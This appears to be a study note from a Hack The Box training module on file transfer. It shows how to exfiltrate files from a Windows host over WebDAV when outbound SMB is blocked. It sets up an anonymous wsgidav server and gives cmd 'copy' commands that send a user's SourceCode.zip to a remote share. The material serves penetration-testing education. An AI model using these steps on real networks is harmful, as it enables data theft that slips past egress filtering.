We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other.

When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.

#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot`.After installing them, we run the `wsgidav` application in the target directory.

#### Installing WebDav Python modules

```shell-session
pepedavidphone@htb[/htb]$ sudo pip3 install wsgidav cheroot
```

#### Using the WebDav Python module
```shell-session
pepedavidphone@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
#### Connecting to the Webdav Share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.
![[Pasted image 20250422121017.png]]**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder.

#### Uploading Files using SMB

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.